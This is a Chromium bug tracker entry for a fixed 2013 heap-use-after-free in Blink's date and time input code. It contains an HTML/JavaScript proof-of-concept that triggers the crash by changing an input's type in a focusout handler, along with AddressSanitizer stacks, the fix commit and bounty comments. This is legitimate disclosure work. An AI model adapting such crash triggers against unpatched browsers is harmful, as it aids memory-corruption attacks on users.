# Heap-use-after-free in WebCore::BaseMultipleFieldsDateAndTimeInputType::~BaseMultipleFieldsDateAndTimeInputType

| Field | Value |
|-------|-------|
| **Issue ID** | [40077573](https://issues.chromium.org/issues/40077573) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ks...@chromium.org |
| **Created** | 2013-05-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free with input and focusout handler

**VERSION**  

Chrome Version: stable + dev  

Operating System: 64bit ubuntu

**REPRODUCTION CASE**

<html>
<head>
<style>
</style>
<script>
onload = function() {
el0=document.createElement('input')
document.body.appendChild(el0)
el0.type='month'
el0.autofocus='x'
el1=document.createElement('div')
document.body.appendChild(el1)
el2=document.createElement('div')
el1.appendChild(el2)
el2.appendChild(document.createTextNode('A'))
document.body.addEventListener('focusout', function(){
el0.type='week'
})
document.designMode='on'
document.execCommand('selectall')
document.execCommand('bold')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: asan+renderer  

Crash State:

==23868== ERROR: AddressSanitizer: heap-use-after-free on address 0x7f5e82fc21a8 at pc 0x7f5e957f161d bp 0x7fff1a9fcb30 sp 0x7fff1a9fcb28  

WRITE of size 8 at 0x7f5e82fc21a8 thread T0 (asan-stable)  

#0 0x7f5e957f161c in removeSpinButtonOwner /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/shadow/SpinButtonElement.h:60:0  

#1 0x7f5e957f161c in WebCore::BaseMultipleFieldsDateAndTimeInputType::~BaseMultipleFieldsDateAndTimeInputType() /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/BaseMultipleFieldsDateAndTimeInputType.cpp:174:0  

#2 0x7f5e9578228d in ~WeekInputType /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/WeekInputType.h:46:0  

#3 0x7f5e9578228d in ~WeekInputType

0x7f5e82fc21a8 is located 104 byt  

freed by thread T0 (asan-stable)  

#0 0x7f5e9346ac82 in operator  

#1 0x7f5e97e9505a in deref /m  

#2 0x7f5e97e9505a in derefIfN  

#3 0x7f5e97e9505a in ~RefPtr  

#4 0x7f5e97e9505a in ~RefPtr

## Attachments

- [104200.html](attachments/104200.html) (text/html; charset=us-ascii, 694 B)
- [stable-104200.txt](attachments/stable-104200.txt) (text/x-c; charset=us-ascii, 28.1 KB)
- [104200.txt](attachments/104200.txt) (text/plain; charset=us-ascii, 20.8 KB)

## Timeline

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-20)

CF report in https://cluster-fuzz.appspot.com/testcase?key=186246341

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=186246341

Uploader: aarya@google.com

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x612000048868
Crash State:
  - crash stack -
  WebCore::BaseMultipleFieldsDateAndTimeInputType::~BaseMultipleFieldsDateAndTimeInputType
  WebCore::WeekInputType::~WeekInputType
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=178763:178818

Minimized Testcase (0.60 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97o_B9Gbpf1T7DQwrAgfUWZ2esbamZUsSx-pwDr8AUp5NnLy1W5Pc2jN6g2rKFV7u6H7fBVnAwNjT7kumYoe3LRnS30LG5a_sZSvX1CJaSX0_MivHHggvhN4cjYU9kERGgsDic9Re5UzYpZnni7rKgbn-SYhw
<script>
      onload = function() {
        el0=document.createElement('input')
        document.body.appendChild(el0)
        el0.type='month'
        el0.autofocus='x'
        el1=document.createElement('div')
        document.body.appendChild(el1)
        el2=document.createElement('div')
        el1.appendChild(el2)
        el2.appendChild(document.createTextNode('A'))
        document.body.addEventListener('focusout', function(){ 
          el0.type='week'
        })
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('bold')
      }
    </script>

### in...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### wf...@chromium.org (2013-05-20)

[Empty comment from Monorail migration]

### tk...@chromium.org (2013-05-20)

yosin, keishi, ksakamoto, can you handle this?


### ks...@chromium.org (2013-05-21)

I will.

### in...@chromium.org (2013-05-21)

Please do read Mark's email titled "Calling a Code 28 for Security Bugs" on chrome-team mailing list.

### tk...@chromium.org (2013-05-21)

This is specific to INPUT_MULTIPLE_FIELDS_UI implementation.
I think generic Shadow DOM API has no problem.


### bu...@chromium.org (2013-05-22)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=150866

------------------------------------------------------------------------
r150866 | ksakamoto@chromium.org | 2013-05-22T06:21:19.387741Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/input-type-change-focusout.html?r1=150866&r2=150865&pathrev=150866
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/html/BaseMultipleFieldsDateAndTimeInputType.cpp?r1=150866&r2=150865&pathrev=150866
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/input-type-change-focusout-expected.txt?r1=150866&r2=150865&pathrev=150866

Changing input.type should not cause focusout

Changing input.type fires focusout event when its focused subfield gets
deleted, but event handler of that focusout can change input.type again.
That causes re-entering to HTMLInputElement::updateType() in the middle
of InputType::destroyShadowSubtree(), and results dangling pointers in
BaseMultipleFieldsDateAndTimeInputType.
This patch makes sure that input does not lose focus by changing type
attribute, by setting focus to the input element itself before deleting
its shadow subtree.

BUG=242224
TEST=fast/forms/input-type-change-focusout.html

Review URL: https://chromiumcodereview.appspot.com/15310003
------------------------------------------------------------------------

### ks...@chromium.org (2013-05-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-22)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-05-23)

ClusterFuzz has detected this issue as fixed in range 201517:201650.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=186246341

Uploader: aarya@google.com

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x612000048868
Crash State:
  - crash stack -
  WebCore::BaseMultipleFieldsDateAndTimeInputType::~BaseMultipleFieldsDateAndTimeInputType
  WebCore::WeekInputType::~WeekInputType
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=178763:178818
Fixed: https://cluster-fuzz.appspot.com/revisions?range=201517:201650

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97o_B9Gbpf1T7DQwrAgfUWZ2esbamZUsSx-pwDr8AUp5NnLy1W5Pc2jN6g2rKFV7u6H7fBVnAwNjT7kumYoe3LRnS30LG5a_sZSvX1CJaSX0_MivHHggvhN4cjYU9kERGgsDic9Re5UzYpZnni7rKgbn-SYhw

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2013-05-28)

M27 is r151272

### sc...@gmail.com (2013-05-28)

M28 is r151273

### sc...@gmail.com (2013-06-03)

@miaubiz: seems you're on fire in our pending patch :D
$1000

### pa...@chromium.org (2013-06-24)

Thanks miaubiz, $3000 coming your way for this one, 240124, and 209604 :)

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/242224?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077573)*
